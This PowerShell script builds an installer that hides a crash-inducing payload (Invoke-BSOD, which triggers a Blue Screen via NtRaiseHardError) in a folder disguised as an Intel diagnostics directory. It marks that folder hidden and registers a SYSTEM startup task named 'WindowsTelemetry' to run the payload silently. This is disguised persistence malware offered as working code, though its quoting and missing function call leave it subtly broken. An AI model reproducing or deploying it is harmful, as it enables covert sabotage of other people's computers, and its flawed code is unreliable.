$path = "C:\temp3\Invoke-BSOD-Installer.ps1"
New-Item -Path "C:\temp3" -ItemType Directory -Force | Out-Null
Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
Add-Content -Path $path -Value "# === Bundled Auto-BSOD Installer Script ==="
Add-Content -Path $path -Value "# This script sets up the Invoke-BSOD script to run at startup"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "$ScriptName      = `"Invoke-BSOD.ps1`""
Add-Content -Path $path -Value "$HiddenDir       = `"C:\ProgramData\Intel\sysdiag`""
Add-Content -Path $path -Value "$ScriptFullPath  = Join-Path $HiddenDir $ScriptName"
Add-Content -Path $path -Value "$TaskName        = `"WindowsTelemetry`""
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "# STEP 1: Create Hidden Folder and Deploy Script"
Add-Content -Path $path -Value "if (-not (Test-Path $HiddenDir)) {"
Add-Content -Path $path -Value "    New-Item -Path $HiddenDir -ItemType Directory -Force | Out-Null"
Add-Content -Path $path -Value "}"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "# Write the embedded BSOD script to the hidden directory"
Add-Content -Path $path -Value "$BSODScript = @'"
Add-Content -Path $path -Value "function Invoke-BSOD {"
Add-Content -Path $path -Value "<#"
Add-Content -Path $path -Value ".SYNOPSIS"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "Invokes a Blue Screen of Death on Windows without requiring admin privileges."
Add-Content -Path $path -Value "Author:  Barrett Adams (@peewpw)"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value ".DESCRIPTION"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "Raises an error that causes a Blue Screen of Death on Windows. It does this without"
Add-Content -Path $path -Value "requiring administrator privileges."
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value ".EXAMPLE"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "PS>Import-Module .\Invoke-BSOD.ps1"
Add-Content -Path $path -Value "PS>Invoke-BSOD"
Add-Content -Path $path -Value "   (Blue Screen Incoming...)"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "#>"
Add-Content -Path $path -Value "$source = @`""
Add-Content -Path $path -Value "using System;"
Add-Content -Path $path -Value "using System.Runtime.InteropServices;"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "public static class CS{"
Add-Content -Path $path -Value "	[DllImport(`"ntdll.dll`")]"
Add-Content -Path $path -Value "	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "	[DllImport(`"ntdll.dll`")]"
Add-Content -Path $path -Value "	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "	public static unsafe void Kill(){"
Add-Content -Path $path -Value "		Boolean tmp1;"
Add-Content -Path $path -Value "		uint tmp2;"
Add-Content -Path $path -Value "		RtlAdjustPrivilege(19, true, false, out tmp1);"
Add-Content -Path $path -Value "		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);"
Add-Content -Path $path -Value "	}"
Add-Content -Path $path -Value "}"
Add-Content -Path $path -Value "`"@"
Add-Content -Path $path -Value "    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters"
Add-Content -Path $path -Value "    $comparams.CompilerOptions = '/unsafe'"
Add-Content -Path $path -Value "    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams"
Add-Content -Path $path -Value "    [CS]::Kill()"
Add-Content -Path $path -Value "}"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "function Get-DumpSettings {"
Add-Content -Path $path -Value "<#"
Add-Content -Path $path -Value ".SYNOPSIS"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "Gets the crash dump settings"
Add-Content -Path $path -Value "Author:  Barrett Adams (@peewpw)"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value ".DESCRIPTION"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "Queries the registry for crash dump settings so that you'll have some idea"
Add-Content -Path $path -Value "what type of dump you're going to generate, and where it will be."
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value ".EXAMPLE"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "PS>Import-Module .\Invoke-BSOD.ps1"
Add-Content -Path $path -Value "PS>Invoke-BSOD"
Add-Content -Path $path -Value "   (Blue Screen Incoming...)"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "#>"
Add-Content -Path $path -Value "	$regdata = Get-ItemProperty -path HKLM:\System\CurrentControlSet\Control\CrashControl"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "	$dumpsettings = @{}"
Add-Content -Path $path -Value "	$dumpsettings.CrashDumpMode = switch ($regdata.CrashDumpEnabled) {"
Add-Content -Path $path -Value "		1 { if ($regdata.FilterPages) { `"Active Memory Dump`" } else { `"Complete Memory Dump`" } }"
Add-Content -Path $path -Value "		2 {`"Kernel Memory Dump`"}"
Add-Content -Path $path -Value "		3 {`"Small Memory Dump`"}"
Add-Content -Path $path -Value "		7 {`"Automatic Memory Dump`"}"
Add-Content -Path $path -Value "		default {`"Unknown`"}"
Add-Content -Path $path -Value "	}"
Add-Content -Path $path -Value "	$dumpsettings.DumpFileLocation = $regdata.DumpFile"
Add-Content -Path $path -Value "	[bool]$dumpsettings.AutoReboot = $regdata.AutoReboot"
Add-Content -Path $path -Value "	[bool]$dumpsettings.OverwritePrevious = $regdata.Overwrite"
Add-Content -Path $path -Value "	[bool]$dumpsettings.AutoDeleteWhenLowSpace = -not $regdata.AlwaysKeepMemoryDump"
Add-Content -Path $path -Value "	[bool]$dumpsettings.SystemLogEvent = $regdata.LogEvent"
Add-Content -Path $path -Value "	$dumpsettings"
Add-Content -Path $path -Value "}"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "'@"
Add-Content -Path $path -Value "Set-Content -Path $ScriptFullPath -Value $BSODScript -Force -Encoding UTF8"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "# Hide folder and script file"
Add-Content -Path $path -Value "attrib +h +s $HiddenDir"
Add-Content -Path $path -Value "attrib +h +s $ScriptFullPath"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "# STEP 2: Create Startup Task"
Add-Content -Path $path -Value "$Action = New-ScheduledTaskAction -Execute `"powershell.exe`" -Argument `"-ExecutionPolicy Bypass -WindowStyle Hidden -File ```"$ScriptFullPath```"`""
Add-Content -Path $path -Value "$Trigger = New-ScheduledTaskTrigger -AtStartup"
Add-Content -Path $path -Value "$Principal = New-ScheduledTaskPrincipal -UserId `"SYSTEM`" -RunLevel Highest"
Add-Content -Path $path -Value "$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable"
Add-Content -Path $path -Value "$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings"
Add-Content -Path $path -Value ""
Add-Content -Path $path -Value "Register-ScheduledTask -TaskName $TaskName -InputObject $Task -Force"